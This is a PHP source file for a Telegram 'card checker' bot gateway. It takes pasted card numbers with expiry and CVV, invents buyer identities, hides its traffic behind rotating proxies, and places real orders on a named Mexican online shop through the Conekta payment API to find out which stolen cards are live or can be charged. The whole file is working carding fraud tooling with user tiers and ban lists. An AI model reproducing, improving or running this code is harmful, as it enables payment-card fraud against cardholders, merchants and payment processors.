<?php
if(strpos($message, '!tg') === 0 or strpos($message, '/tg') === 0 or strpos($message, '.tg') === 0){
    sendaction($chatId, typing);
        $NameGater ='Tang';
$gateway = '/tg :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

#EMPIEZA EL PROCESO DE CHEQUEO

if(strlen($ano) == 2){
    $ano = '20'.$ano;
    };
    
    
if ($mes < 10) {
        $mes = substr($mes, -1);
}

$retry = 0;

start:
    
if($retry > 7)
{
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Error Proxy</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}


#------[CURL-2]------#
$rotate = rotate();
$socks5 = socks5();



$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];




$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://nutran.mx/product/rhabil/');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /product/rhabil/ HTTP/2';
$headers[] = 'Host: nutran.mx';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer:https://nutran.mx/product/rhabil/';
$headers[] = 'Origin: https://nutran.mx';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'quantity=1&action=flatsome_ajax_add_to_cart&add-to-cart=723');
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://nutran.mx/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: nutran.mx';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer: https://nutran.mx/carrito/';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$process_checkout_nonce = getStr($curl, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.conekta.io/tokens');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.conekta.io';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0';
$headers[] = 'Accept: application/vnd.conekta-v0.3.0+json';
$headers[] = 'Accept-Language: es';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer: https://nutran.mx/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'RaiseHtmlError: false';
$headers[] = 'Conekta-Client-User-Agent: {"agent":"Conekta JavascriptBindings-AJAX/v0.3.2 build 2.0.17"}';
$headers[] = 'Authorization: Basic a2V5X1l1TUtzWXR1NThQeXNlRHFYQXlUM0J3Og==';
$headers[] = 'Origin: https://nutran.mx';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"number":"'.$cc.'","name":"'.$firstname.' '.$lastname.'","cvc":"'.$cvv.'","exp_month":"'.$mes.'","exp_year":"'.$ano.'","device_fingerprint":"dur5ax7r0u1o9onk8yfu2m1n7ln9yxwx"}}');
$curl = curl_exec($ch);
$id = trim(strip_tags(getStr($curl, '"id":"', '"')));


$data = array(
  'billing_email' => $email,
  'billing_first_name' => $firstname,
  'billing_last_name' => $lastname,
  'billing_country' => 'MX', 
  'billing_address_1' =>'Av. Insurgentes Sur 1838',
  'billing_address_2' => 'Mex',
  'billing_city' => 'Ciudad de Mexico',
  'billing_state' => 'NA',
  'billing_postcode' => '01030',
  'billing_phone' => '015556635371',
  'shipping_first_name' => '',
  'shipping_last_name' => '',
  'shipping_country' => 'MX',
  'shipping_address_1' => '',
  'shipping_address_2' => '',
  'shipping_city' => '',
  'shipping_state' => 'GT',
  'shipping_postcode' => '',
  'order_comments' => '',
  'shipping_method[0]' => 'apg_shipping:5',
  'payment_method' => 'conektacard',
  'terms' => 'on',
  'terms-field' => '1',
  'woocommerce-process-checkout-nonce' => $process_checkout_nonce,
  '_wp_http_referer' => '/?wc-ajax=update_order_review',
  'conekta_token' => $id,
);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://nutran.mx/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /?wc-ajax=checkout HTTP/2';
$headers[] = 'Host: nutran.mx';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer: https://nutran.mx/checkout/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://nutran.mx';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
$curl = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://nutran.mx/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: nutran.mx';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer: https://nutran.mx/carrito/';
$headers[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$error = trim(getStr($curl, '<span class="message-icon icon-close"></span>', '</div>'));
$error1 = trim(getStr($curl, '<span class="message-icon icon-close"></span>
				', '</div>'));
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Poseidón
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if($error == "s"){
$status = "[Approved!🟩 ]";
$response = "Charged 🟩";
}elseif (strpos($error, "Error: La tarjeta tiene fondos insuficientes. Intenta con otra tarjeta o método de pago.")){ 
$status = "Live🟩";
$response = "Insufficient funds 🟩";
}elseif (strpos($result2, "three_d_secure_2_source") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "[ DECLINED 🔴 ]";
$response = "3D Card.❌";
}elseif (strpos($result2, "Your card does not support this type of purchase")){ 
$status = "[ DECLINED 🔴 ]";
$response = "Your card does not support this type of purchase🟥";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "[ DECLINED 🔴 ]";
$response = "do_not_honor";
}elseif (strpos($result2, "invalid_account")){ 
$status = "[ DECLINED 🔴 ]";
$response = "invalid_account";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "Error: Tarjeta declinada. Intenta con otra tarjeta o método de pago.";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card ⤿  <code>$cc|$mes|$ano|$cvv</code> 
Status ⤿  $status
Response ⤿ $response 
Gateway ⤿ $NameGater
──────────────────────
◈Country ⤿ <code>$country </code>$emoji 
◈Type ⤿ <code>$type</code> 
◈Level ⤿ <code>$scheme</code>
◈Vendor ⤿ <code>$brand</code>
◈Bank ⤿ <code>$bank </code> 
──────────────────────
Time ⤿  $tiempo s
@RitaaChk_Bot
Chk By ⤿ <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

?>

